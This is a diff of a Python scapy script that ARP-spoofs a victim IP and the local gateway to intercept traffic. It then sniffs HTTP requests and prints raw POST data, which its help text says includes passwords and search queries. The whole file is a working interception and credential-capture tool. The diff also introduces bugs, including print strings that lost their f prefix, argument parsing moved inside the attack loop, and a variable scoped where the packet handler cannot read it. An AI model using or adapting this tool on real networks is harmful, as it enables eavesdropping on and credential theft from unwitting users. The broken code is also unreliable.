@@ -1,12 +1,21 @@
 from scapy.all import *
+from scapy.layers.http import HTTPRequest
 import sys
 import os
 import time
+import argparse
+
+from colorama import init, Fore
+
+init()
+GREEN = Fore.GREEN
+RED = Fore.RED
+RESET = Fore.RESET
  
 try:
-    interface = "wlp6s0"
+    interface = "wlan0"
     victimIP = input("[*] Enter Victim IP: ")
-    gateIP = "10.0.0.1"
+    gateIP = "192.168.1.1"
 except KeyboardInterrupt:
     print("\n[*] User Requested Shutdown")
     print("[*] Exiting...")
@@ -22,7 +31,6 @@ def get_mac(IP):
         return rcv.sprintf(r"%Ether.src%")
  
 def reARP():
-    
     print("\n[*] Restoring Targets...")
     victimMAC = get_mac(victimIP)
     gateMAC = get_mac(gateIP)
@@ -35,9 +43,9 @@ def reARP():
  
 def trick(gm, vm):
     send(ARP(op = 2, pdst = victimIP, psrc = gateIP, hwdst= vm))
-    send(ARP(op = 2, pdst = gateIP, psrc = victimIP, hwdst= gm))
-    send(IP(src=victimIP, dst=gateIP)/ICMP()/"Hello World")
-    send(IP(src=victimIP, dst=gateIP)/TCP(sport=80, dport=80), packets=10000)
+    #send(ARP(op = 2, pdst = gateIP, psrc = victimIP, hwdst= gm))
+    #send(IP(src=victimIP, dst=gateIP)/ICMP()/"Hello World")
+    #send(IP(src=victimIP, dst=gateIP)/TCP(sport=80, dport=80), count=10000)
 
 def sniff_packets(iface=None):
     """
@@ -62,11 +70,12 @@ def process_packet(packet):
         ip = packet[IP].src
         # get the request method
         method = packet[HTTPRequest].Method.decode()
-        print(f"\n{GREEN}[+] {ip} Requested {url} with {method}{RESET}")
+        print("\n{GREEN}[+] {ip} Requested {url} with {method}{RESET}")
         if show_raw and packet.haslayer(Raw) and method == "POST":
             # if show_raw flag is enabled, has raw data, and the requested method is "POST"
             # then show raw
-            print(f"\n{RED}[*] Some useful Raw data: {packet[Raw].load}{RESET}")
+            print("\n{RED}[*] Some useful Raw data: {packet[Raw].load}{RESET}")
+    
             
 def mitm():
     try:
@@ -87,19 +96,30 @@ def mitm():
     while 1:
         try:
             trick(gateMAC, victimMAC)
-            time.sleep(1.5)
+            parser = argparse.ArgumentParser(description="HTTP Packet Sniffer, this is useful when you're a man in the middle." \
+                                    + "It is suggested that you run arp spoof before you use this script, otherwise it'll sniff your personal packets")
+            parser.add_argument("-i", "--iface", help="Interface to use, default is scapy's default interface")
+            parser.add_argument("--show-raw", dest="show_raw", action="store_true", help="Whether to print POST raw data, such as passwords, search queries, etc.")
+            args = parser.parse_args()
+            iface = args.iface
+            show_raw = args.show_raw
+            sniff_packets(iface)
+            time.sleep(60)
         except KeyboardInterrupt:
             reARP()
             break
-mitm()
 
-import argparse
-parser = argparse.ArgumentParser(description="HTTP Packet Sniffer, this is useful when you're a man in the middle." \
-                                    + "It is suggested that you run arp spoof before you use this script, otherwise it'll sniff your personal packets")
-parser.add_argument("-i", "--iface", help="Interface to use, default is scapy's default interface")
-parser.add_argument("--show-raw", dest="show_raw", action="store_true", help="Whether to print POST raw data, such as passwords, search queries, etc.")
+
+mitm()
+#parser = argparse.ArgumentParser(description="HTTP Packet Sniffer, this is useful when you're a man in the middle." \
+                                   # + "It is suggested that you run arp spoof before you use this script, otherwise it'll sniff your personal packets")
+#parser.add_argument("-i", "--iface", help="Interface to use, default is scapy's default interface")
+#parser.add_argument("--show-raw", dest="show_raw", action="store_true", help="Whether to print POST raw data, such as passwords, search queries, etc.")
 # parse arguments
-args = parser.parse_args()
-iface = args.iface
-show_raw = args.show_raw
-sniff_packets(iface)
+#mitm(parser)
+#args = parser.parse_args()
+#iface = args.iface
+#show_raw = args.show_raw
+#sniff_packets(iface)
+
+
